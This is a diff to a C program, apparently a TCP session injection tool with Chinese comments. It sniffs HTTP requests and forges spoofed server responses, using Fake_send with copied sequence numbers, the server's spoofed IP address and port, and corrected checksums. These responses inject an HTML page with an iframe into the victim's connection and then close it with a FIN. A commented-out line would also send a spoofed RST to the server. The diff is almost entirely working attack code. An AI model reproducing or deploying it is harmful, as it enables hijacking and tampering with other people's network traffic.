@@ -42,8 +42,8 @@ int TCP_RST_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u
 unsigned short in_cksum(unsigned short *addr,int len);
 /* Function Prototypes */
 //具体的分析见5step.md       
-//Fake_send(包的seq,包的ack，包的内容,包的标志位,包的源地址,包的目的地址，包的源端口，包的目的端口)
-int Fake_send(u_int32 seq,u_int32 ack,char * content,u_char flag,u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt);
+//Fake_send(包的seq,包的ack，包的内容,包的标志位,ident,off,包的源地址,包的目的地址，包的源端口，包的目的端口)
+int Fake_send(u_int32 seq,u_int32 ack,char * content,u_char flag,u_short ip_id,u_short ip_off,u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt);
 /* Ethernet addresses are 6 bytes */
 #define ETHER_ADDR_LEN	6
 
@@ -230,17 +230,17 @@ while(1){
       
       //具体的分析见5step.md
       //Fake_send(包的seq,包的ack，包的内容,包的标志位，包的源地址,包的目的地址，包的源端口，包的目的端口)
-      request_seqPlusLength=g_htonl(g_ntohl(tcp->th_seq)+355);
+      request_seqPlusLength=g_htonl(g_ntohl(tcp->th_seq)+467);
       
       html_content="HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Tue, 29 Jan 2013 04:42:24 GMT\r\nContent-Type: text/html\r\nContent-Length:5946\r\nLast-Modified: Tue, 29 Jan 2013 04:42:01 GMT\r\nConnection: keep-alive\r\nAccept-Ranges: bytes\r\n\r\n<html><head><meta http-equiv='pragma' content='no-cache'><meta http-equiv='cache-control' content='no-cache,must-revalidate'></head><body><h1>hhhhhhhhhhhh</h1><iframe width='1000' border='0' height='700' src='http://www.baidu.com/'></iframe></body></html>\n";     
 
      first_seq   = tcp->th_ack;
-     secound_seq = g_htonl(g_ntohl(tcp->th_ack)+0);
-     third_seq   = g_htonl(g_ntohl(secound_seq)+466);
+     secound_seq = tcp->th_ack;
+     third_seq   = g_htonl(g_ntohl(secound_seq)+465);
 
-Fake_send(first_seq   ,request_seqPlusLength,""          ,TH_ACK          ,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
-Fake_send(secound_seq ,request_seqPlusLength,html_content,TH_ACK|TH_PUSH  ,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
-Fake_send(third_seq   ,request_seqPlusLength,""          ,TH_ACK|TH_FIN   ,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
+//Fake_send(first_seq   ,request_seqPlusLength,""          ,TH_ACK          ,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
+Fake_send(secound_seq ,request_seqPlusLength,html_content,TH_ACK|TH_PUSH  ,ip->ip_id,ip->ip_off,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
+Fake_send(third_seq   ,request_seqPlusLength,""          ,TH_ACK|TH_FIN   ,ip->ip_id,ip->ip_off,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
       //preten be client, and sent RST to server....fack client
       //TCP_RST_send(htonl(ntohl(tcp->th_seq)+1), ip->ip_src.s_addr, ip->ip_dst.s_addr, tcp->th_sport, tcp->th_dport);
       printf("\n+-------------------------+\n");
@@ -276,8 +276,8 @@ return 0;
 
 }
 //具体的分析见5step.md
-//Fake_send(包的seq,包的ack，包的内容,包的标志位,包的源地址,包的目的地址，包的源端口，包的目的端口)
-int Fake_send(u_int32 seq,u_int32 ack,char * content,u_char flag,u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt)
+//Fake_send(包的seq,包的ack，包的内容,包的标志位,ident,ip->ip_off,包的源地址,包的目的地址，包的源端口，包的目的端口)
+int Fake_send(u_int32 seq,u_int32 ack,char * content,u_char flag,u_short ident,u_short ip_off,u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt)
 {
 
   //static int i=0;
@@ -353,12 +353,12 @@ int Fake_send(u_int32 seq,u_int32 ack,char * content,u_char flag,u_int32 src_ip,
   ipheader->ip_tos = 0;    /* Type of Service (Usually zero)                 */
   
   //加了包大小计算的地方之一
-  ipheader->ip_len = g_htons( sizeof (struct ip) + sizeof (struct tcphdr)+ payload_len+1 );         
-  ipheader->ip_off = 0;    /* Fragment offset. We'll not use this            */
+  ipheader->ip_len = g_htons( sizeof (struct ip) + sizeof (struct tcphdr)+ payload_len );         
+  ipheader->ip_off = ip_off;    /* Fragment offset. We'll not use this            */
   ipheader->ip_ttl = 64;   /* Time to live: 64 in Linux, 128 in Windows...   */
   ipheader->ip_p = 6;      /* Transport layer prot. TCP=6, UDP=17, ICMP=1... */
   ipheader->ip_sum = 0;    /* Checksum. It has to be zero for the moment     */
-  ipheader->ip_id = g_htons( 1337 ); 
+  ipheader->ip_id = ident+g_htonl(39289); 
   ipheader->ip_src.s_addr = src_ip;  /* Source IP address                    */
   ipheader->ip_dst.s_addr = dst_ip;  /* Destination IP address               */
 
@@ -369,7 +369,7 @@ int Fake_send(u_int32 seq,u_int32 ack,char * content,u_char flag,u_int32 src_ip,
   tcpheader->th_x2 = 0;           /* Variable in 4 byte blocks. (Deprecated) */
   tcpheader->th_off = 5;      /* Segment offset (Lenght of the header)   */
   tcpheader->th_flags = flag;   /* 原来这里设置成了RST，我们不能这么干        */
-  tcpheader->th_win = g_htons(4500) + rand()%1000;/* Window size               */
+  tcpheader->th_win = g_htons(123);/* Window size               */
   tcpheader->th_urp = 0;          /* Urgent pointer.                         */
   tcpheader->th_sport = src_prt;  /* Source Port                             */
   tcpheader->th_dport = dst_prt;  /* Destination Port                        */
@@ -381,7 +381,7 @@ int Fake_send(u_int32 seq,u_int32 ack,char * content,u_char flag,u_int32 src_ip,
   pseudohdr.zero = 0;
   pseudohdr.protocol = ipheader->ip_p;
   //加了包大小的地方之一
-  pseudohdr.tcplen = g_htons(sizeof(struct tcphdr));
+  pseudohdr.tcplen = g_htons(sizeof(struct tcphdr)+payload_len);
 
   /* Copy header and pseudoheader to a buffer to compute the checksum */  
   memcpy(tcpcsumblock, &pseudohdr, sizeof(tcp_phdr_t));   
